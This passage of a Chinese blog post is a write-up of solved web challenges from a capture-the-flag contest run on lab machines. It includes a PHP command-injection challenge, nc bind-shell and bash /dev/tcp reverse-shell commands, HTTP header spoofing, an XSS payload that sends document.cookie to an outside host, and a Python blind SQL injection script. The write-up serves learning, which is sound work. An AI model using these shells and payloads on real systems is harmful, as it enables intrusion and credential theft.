class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">if (!isset($_POST[&#39;girl_friend&#39;])) &#123;</span><br><span class="line">    die(&quot;where is P3rh4ps&#39;s girl friend ???&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $girl &#x3D; $_POST[&#39;girl_friend&#39;];</span><br><span class="line">    if (preg_match(&#39;&#x2F;\&gt;|\\\&#x2F;&#39;, $girl)) &#123;</span><br><span class="line">        die(&#39;just girl&#39;);</span><br><span class="line">    &#125; else if (preg_match(&#39;&#x2F;ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$&#x2F;i&#39;, $girl)) &#123;</span><br><span class="line">        echo &quot;&lt;img src&#x3D;&#39;img&#x2F;p3_need_beautiful_gf.png&#39;&gt; &lt;!-- He is p3 --&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        &#x2F;&#x2F;duangShell~~~~</span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现我们应该要传入一个名为 <code>girl_friend</code> 的 POST，要经过各种过滤，然后在 exec 处命令执行，这里就有一个坎，就是 exec 是无回显的，需要反弹shell，而我刚好之前没做过这种，所以当时第一次做就很懵，怎么尝试也失败了 😥</p>
+<p>第二次是在第二天做的，在网上搜了大量资料之后也是知道了这是个<a target="_blank" rel="noopener" href='https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html'>反弹shell</a>，奈何水平实在不够，最后还是失败了</p>
+<p>赛后看了师傅的题解，若有所悟……（附：<a target="_blank" rel="noopener" href='https://blog.csdn.net/qq_27080743/article/details/72820570?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task'>在Linux上创建txt文件，并编辑</a>  |  <a target="_blank" rel="noopener" href='https://man.linuxde.net/curl'>curl命令</a>）</p>
+<p>我们用的是 BUU Basic 模块的 Linux labs 靶机，首先连上靶机，用 <code>ifconfig</code> 命令查看自己的 IP 地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inet addr:174.1.92.180</span><br></pre></td></tr></table></figure>
+
+<p>然后输入命令 <code>nc -lvp 2333</code> 来监听本机的 2333 端口，在题目处构造 POST： <code>curl 174.1.92.180:2333</code></p>
+<p>靶机处接收到 curl 的信息：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">listening on [any] 2333 ...</span><br><span class="line">connect to [174.1.92.180] from 5967-b6a7b6e3-da57-4f6b-91e5-e86d8f6aa527.1.lx78hcv02iidom0d05i2cok6w.ctfd_swarm [174.1.93.176] 51546</span><br><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>174.1.92.180:2333</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>curl/7.61.1</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br></pre></td></tr></table></figure>
+
+<p>得到题目的位置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">174.1.93.176</span><br></pre></td></tr></table></figure>
+
+<p>我们到题目处监听端口：<code>nc -lvp 2333 -e /bin/sh</code> ，把 shell 绑定到 2333 端口，然后在靶机处连上：<code>nc 174.1.93.176 2333 </code> （正向 nc 连 shell）</p>
+<p>连上之后我们直接用 <code>ls /</code> 查看当前目录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure>
+
+<p>发现 flag，我们用命令打开查看 <code>cat /flag</code> 得到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;flag-is-not-here,please-find-it-by-yourself&#125;</span><br></pre></td></tr></table></figure>
+
+<p>显然我们是被摆了一道，我们用 find 找一下 flag：<code>find / -name flag</code> ，得到了真正的 flag 的地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;demo&#x2F;P3rh4ps&#x2F;love&#x2F;you&#x2F;flag</span><br><span class="line">&#x2F;flag</span><br></pre></td></tr></table></figure>
+
+<p>所以我们直接 <code>cat /etc/demo/P3rh4ps/love/you/flag</code> （这次比赛 P3 或成最大赢家）</p>
+<p>得到 flag 👍</p>
+<p>当然方法不止正向连接这一种，毕竟谭总本意是要考察反弹shell，我也对其进行一波操作</p>
+<h3 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h3><p>还是先 <code>ifconfig</code> 查看 IP：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inet addr:174.1.94.90</span><br></pre></td></tr></table></figure>
+
+<p>然后我们创建 <code>duidui.txt</code> 文件并进行编辑：<code>vi duidui.txt</code> ，在其中写入 shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/174.1.94.90/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>然后利用 <code>nc -lvp 2333</code> 监听 2333 端口，在网页端构造 POST：``</p>
+<h2 id="假猪套天下第一"><a href="#假猪套天下第一" class="headerlink" title="假猪套天下第一"></a>假猪套天下第一</h2><p>本题考察  Http头</p>
+<p>这题说来好水……🌚，当时没咋想，觉得自己可能做不出就没做了……🌚</p>
+<p>我们首先进入页面，是要求我们登录，随便输一个非 admin 之外的账号都可以直接登进，顺带一提这里有个小彩蛋就是你不输入账户名的话会弹出：<code>不能为空 你登录你妈呢</code> emmmm暴躁老Y1ng</p>
+<p>但是登进去了啥也莫得，审查源代码也没啥有用的玩意儿，<abbr title='当时一直在想 flask 和 shell 那两题'>当时我到了这里就直接退了</abbr>……连抓包都没抓……😱</p>
+<p>我们登录，同时用 Burp 抓包查看，在页面最下方发现了</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- L0g1n.php --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>同时我们查看响应头知道是因为 302 页面重定向使得页面跳转至了 <code>profile.php</code></p>
+<p>我们进入 <code>L0g1n.php</code> ，页面是直接给我们显示：<code>Sorry, this site will be available after totally 99 years!</code></p>
+<p>要我们 99 年之后再来，？查看 Cookie 发现了名为 time 的时间戳，修改为 99 年之后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time: 1585099440 ——&gt; time: 4709150640</span><br></pre></td></tr></table></figure>
+
+<p>页面显示文字：<code>Sorry, this site is only optimized for those who comes from localhost</code></p>
+<p>要我们用本地请求，所以我们添加一个 Requests ：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>但是页面无情显示：<code>Do u think that I dont know X-Forwarded-For? Too young too simple sometimes naive</code></p>
+<p>就是说我们要换一个，我们可以用 Client-IP：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Client-IP</span><span class="punctuation">: </span>127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>得到页面显示：<code>Sorry, this site is only optimized for those who come from gem-love.com</code></p>
+<p>要求来自 <code>gem-love.com</code> ，我们可以构造：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>gem-love.com</span><br></pre></td></tr></table></figure>
+
+<p>页面显示：<code>Sorry, this site is only optimized for browsers that run on Commodo 64</code></p>
+<p>不知道 <code>Commodo 64</code> 是啥，在谷歌上一搜，原来是 <code>Commodore 64</code> ，是一个老牌计算机系统，所以我们修改一下 User-Agent：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Commodore 64</span><br></pre></td></tr></table></figure>
+
+<p>得到：<code>Sorry, this site is only optimized for those whose email is root@gem-love.com</code></p>
+<p>emmm要求 from <a href="mailto:&#114;&#x6f;&#111;&#116;&#x40;&#x67;&#101;&#x6d;&#45;&#108;&#x6f;&#x76;&#101;&#x2e;&#x63;&#111;&#x6d;">&#114;&#x6f;&#111;&#116;&#x40;&#x67;&#101;&#x6d;&#45;&#108;&#x6f;&#x76;&#101;&#x2e;&#x63;&#111;&#x6d;</a> ，我们添加：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">From</span><span class="punctuation">: </span>root@gem-love.com</span><br></pre></td></tr></table></figure>
+
+<p>然后又双叒叕出了要求：（QAQ）<code>Sorry, this site is only optimized for those who use the http proxy of y1ng.vip if you dont have the proxy, pls contact us to buy, ￥100/Month</code></p>
+<p>😑 Oh dear，you see see this requirement，it’s so fucking shit</p>
+<p>我们构造：（这里用到的是 <a target="_blank" rel="noopener" href='https://blog.csdn.net/21aspnet/article/details/8136173'>via</a>）</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">via</span><span class="punctuation">: </span>y1ng.vip</span><br></pre></td></tr></table></figure>
+
+<p>终于得到了：<code>Sorry, even you are good at http header, you&#39;re still not my admin. Althoungh u found me, u still dont know where is flag</code></p>
+<p>我们 F12 审查元素发现在这句话下面有注释：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--ZmxhZ3s0ZTQ5YzQ1OS0zMTg4LTQ4NjEtOWY5OS03OGE4ZDk0N2U0MWF9Cg==--&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>将注释内容转码即可得到 flag</p>
+<h2 id="代码很长，但没有杨大树长"><a href="#代码很长，但没有杨大树长" class="headerlink" title="代码很长，但没有杨大树长"></a>代码很长，但没有杨大树长</h2><p>本题考察  源码泄露  |  PHP原生类反序列化</p>
+<p>这题就是 BUU 上的 XSS之光……以前刷题还没遇到过 XSS， 现在遇到辽，很 nice</p>
+<p>首先进入网页，啥都没得，页面显示 gungungun 也不是什么鸟提示，页面源码也没啥信息，请求头和响应头也没藏东西，唯一的看点就是这是 5.60 版本的PHP，猜测只能是源码泄露了，手动试了一下发现 <code>,git</code> 被 403 了，所以是 GIT 源码泄露，直接 GIThack 一波得到源码：</p>
+<p><code>index.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;yds_is_so_beautiful&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<p>可以看见传入了名为 <code>yds_is_so_beautiful</code> 的 GET 参数（这题不是杨大树本人出的叭……这么自黑的咩），关键的就是将其反序列化，但是并没有发现题目中给出了可以利用的类，所以我卡死在这里了……</p>
+<p>后来拜读了 <strong><a target="_blank" rel="noopener" href='https://www.gem-love.com/ctf/2097.html#XSS' style='text-decoration: none; color: black'>Y1ng 师傅的题解</a></strong>……才晓得原来可以利用原生类进行反序列化（<a target="_blank" rel="noopener" href='http://blog.ydspoplar.top/2020/03/17/php%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84%E5%8E%9F%E7%94%9F%E7%B1%BB/'>php可利用的原生类</a> &lt;—— 来自出题人的死亡凝视）</p>
+<p>我们利用 <code>Exception</code> 类进行 XSS 反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;window.open(&#x27;http://d21aa841-4eb8-4021-b0b6-ada6b0aa6b5b.node3.buuoj.cn/?&#x27; + document.cookie);&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> urldecode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:9:&quot;Exception&quot;:7:&#123;s:10:&quot; * message&quot;;s:111:&quot;&lt;script&gt;window.open(&#x27;http://d21aa841-4eb8-4021-b0b6-ada6b0aa6b5b.node3.buuoj.cn/?&#x27;   document.cookie);&lt;/script&gt;&quot;;s:17:&quot; Exception string&quot;;s:0:&quot;&quot;;s:7:&quot; * code&quot;;i:0;s:7:&quot; * file&quot;;s:24:&quot;D:\Phpwork\test\test.php&quot;;s:7:&quot; * line&quot;;i:2;s:16:&quot; Exception trace&quot;;a:0:&#123;&#125;s:19:&quot; Exception previous&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们在此之前添加 <code>?yds_is_so_beautiful=</code> 构造 payload 提交，在 Cookie 中获得 flag</p>
+<h2 id="Girlfriend注入"><a href="#Girlfriend注入" class="headerlink" title="Girlfriend注入"></a>Girlfriend注入</h2><p>考察盲注</p>
+<p>直接贴 exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回字段</span></span><br><span class="line">S = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># URL</span></span><br><span class="line">url = <span class="string">&#x27;http://7e4dc31f-472f-4ed9-84c1-a17bb125265b.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pay</span>(<span class="params">time, num</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;^(ascii(substr((password),&#123;times&#125;,1))&gt;&#123;num&#125;)#&#x27;</span></span><br><span class="line">    data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin\\&quot;</span>, <span class="string">&quot;password&quot;</span>: payload.<span class="built_in">format</span>(times=time, num=num)&#125;</span><br><span class="line">    content = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> content.text.find(<span class="string">&#x27;P3rh4ps&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">        res = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="comment"># 上限 &amp; 下限</span></span><br><span class="line">    low = <span class="number">31</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 二分</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        <span class="comment"># 取中</span></span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> pay(i, mid):</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    </span><br><span class="line">    f = <span class="built_in">int</span>((low + high + <span class="number">1</span>)) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">127</span> <span class="keyword">or</span> f == <span class="number">31</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    S += <span class="built_in">chr</span>(f)</span><br><span class="line">    <span class="built_in">print</span>(S)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nEND! And Echo: &quot;</span>, S)</span><br></pre></td></tr></table></figure>
+
+<h1 id="Element-Master"><a href="#Element-Master" class="headerlink" title="Element Master"></a>Element Master</h1><p>这题在源码中有俩个 hidden id 属性，是十六进制，我们将其转为 ASCII 发现是 Po.php，高中话学基础还是有的，发现这是个元素，然后结合 element，试了试别的元素，emmm试不出，写个脚本跑下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://d95d6f54-b3e8-43a0-b71e-a1bcb9aed051.node3.buuoj.cn/&#x27;</span></span><br><span class="line"></span><br><span class="line">elements = (<span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;He&#x27;</span>, <span class="string">&#x27;Li&#x27;</span>, <span class="string">&#x27;Be&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;Ne&#x27;</span>, <span class="string">&#x27;Na&#x27;</span>, <span class="string">&#x27;Mg&#x27;</span>, <span class="string">&#x27;Al&#x27;</span>, <span class="string">&#x27;Si&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;Cl&#x27;</span>, <span class="string">&#x27;Ar&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;Ca&#x27;</span>, <span class="string">&#x27;Sc&#x27;</span>, <span class="string">&#x27;Ti&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;Cr&#x27;</span>, <span class="string">&#x27;Mn&#x27;</span>, <span class="string">&#x27;Fe&#x27;</span>, <span class="string">&#x27;Co&#x27;</span>, <span class="string">&#x27;Ni&#x27;</span>, <span class="string">&#x27;Cu&#x27;</span>, <span class="string">&#x27;Zn&#x27;</span>, <span class="string">&#x27;Ga&#x27;</span>, <span class="string">&#x27;Ge&#x27;</span>, <span class="string">&#x27;As&#x27;</span>, <span class="string">&#x27;Se&#x27;</span>, <span class="string">&#x27;Br&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Kr&#x27;</span>, <span class="string">&#x27;Rb&#x27;</span>, <span class="string">&#x27;Sr&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Zr&#x27;</span>, <span class="string">&#x27;Nb&#x27;</span>, <span class="string">&#x27;Mo&#x27;</span>, <span class="string">&#x27;Te&#x27;</span>, <span class="string">&#x27;Ru&#x27;</span>, <span class="string">&#x27;Rh&#x27;</span>, <span class="string">&#x27;Pd&#x27;</span>, <span class="string">&#x27;Ag&#x27;</span>, <span class="string">&#x27;Cd&#x27;</span>, <span class="string">&#x27;In&#x27;</span>, <span class="string">&#x27;Sn&#x27;</span>, <span class="string">&#x27;Sb&#x27;</span>, <span class="string">&#x27;Te&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;Xe&#x27;</span>, <span class="string">&#x27;Cs&#x27;</span>, <span class="string">&#x27;Ba&#x27;</span>, <span class="string">&#x27;La&#x27;</span>, <span class="string">&#x27;Ce&#x27;</span>, <span class="string">&#x27;Pr&#x27;</span>, <span class="string">&#x27;Nd&#x27;</span>, <span class="string">&#x27;Pm&#x27;</span>, <span class="string">&#x27;Sm&#x27;</span>, <span class="string">&#x27;Eu&#x27;</span>, <span class="string">&#x27;Gd&#x27;</span>, <span class="string">&#x27;Tb&#x27;</span>, <span class="string">&#x27;Dy&#x27;</span>, <span class="string">&#x27;Ho&#x27;</span>, <span class="string">&#x27;Er&#x27;</span>, <span class="string">&#x27;Tm&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Yb&#x27;</span>, <span class="string">&#x27;Lu&#x27;</span>, <span class="string">&#x27;Hf&#x27;</span>, <span class="string">&#x27;Ta&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;Re&#x27;</span>, <span class="string">&#x27;Os&#x27;</span>, <span class="string">&#x27;Ir&#x27;</span>, <span class="string">&#x27;Pt&#x27;</span>, <span class="string">&#x27;Au&#x27;</span>, <span class="string">&#x27;Hg&#x27;</span>, <span class="string">&#x27;Tl&#x27;</span>, <span class="string">&#x27;Pb&#x27;</span>, <span class="string">&#x27;Bi&#x27;</span>, <span class="string">&#x27;Po&#x27;</span>, <span class="string">&#x27;At&#x27;</span>, <span class="string">&#x27;Rn&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Fr&#x27;</span>, <span class="string">&#x27;Ra&#x27;</span>, <span class="string">&#x27;Ac&#x27;</span>, <span class="string">&#x27;Th&#x27;</span>, <span class="string">&#x27;Pa&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;Np&#x27;</span>, <span class="string">&#x27;Pu&#x27;</span>, <span class="string">&#x27;Am&#x27;</span>, <span class="string">&#x27;Cm&#x27;</span>, <span class="string">&#x27;Bk&#x27;</span>, <span class="string">&#x27;Cf&#x27;</span>, <span class="string">&#x27;Es&#x27;</span>, <span class="string">&#x27;Fm&#x27;</span>,<span class="string">&#x27;Md&#x27;</span>, <span class="string">&#x27;No&#x27;</span>, <span class="string">&#x27;Lr&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Rf&#x27;</span>, <span class="string">&#x27;Db&#x27;</span>, <span class="string">&#x27;Sg&#x27;</span>, <span class="string">&#x27;Bh&#x27;</span>, <span class="string">&#x27;Hs&#x27;</span>, <span class="string">&#x27;Mt&#x27;</span>, <span class="string">&#x27;Ds&#x27;</span>, <span class="string">&#x27;Rg&#x27;</span>, <span class="string">&#x27;Cn&#x27;</span>, <span class="string">&#x27;Nh&#x27;</span>, <span class="string">&#x27;Fl&#x27;</span>, <span class="string">&#x27;Mc&#x27;</span>, <span class="string">&#x27;Lv&#x27;</span>, <span class="string">&#x27;Ts&#x27;</span>, <span class="string">&#x27;Og&#x27;</span>, <span class="string">&#x27;Uue&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> element <span class="keyword">in</span> elements:</span><br><span class="line">    response = requests.get((url + element + <span class="string">&#x27;.php&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(response.text, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
+
+<p>跑出了 flag 所在的 php文件地址，访问获得 flag</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%A7%E8%87%B4%E6%A6%82%E8%A7%88"><span class="toc-number">1.</span> <span class="toc-text">大致概览</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%87%AA%E6%88%91%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">自我分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-number">3.</span> <span class="toc-text">题解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Fake-google"><span class="toc-number">3.1.</span> <span class="toc-text">Fake google</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%81%E9%BB%91%E5%AE%A2"><span class="toc-number">3.2.</span> <span class="toc-text">老黑客</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Schro%CC%88dinger"><span class="toc-number">3.3.</span> <span class="toc-text">Schrödinger</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#duangShell"><span class="toc-number">3.4.</span> <span class="toc-text">duangShell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="toc-number">3.4.1.</span> <span class="toc-text">法二：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80"><span class="toc-number">3.5.</span> <span class="toc-text">假猪套天下第一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%BE%88%E9%95%BF%EF%BC%8C%E4%BD%86%E6%B2%A1%E6%9C%89%E6%9D%A8%E5%A4%A7%E6%A0%91%E9%95%BF"><span class="toc-number">3.6.</span> <span class="toc-text">代码很长，但没有杨大树长</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Girlfriend%E6%B3%A8%E5%85%A5"><span class="toc-number">3.7.</span> <span class="toc-text">Girlfriend注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Element-Master"><span class="toc-number">4.</span> <span class="toc-text">Element Master</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/03/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A-BJDCTF-%E6%80%BB%E7%BB%93/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
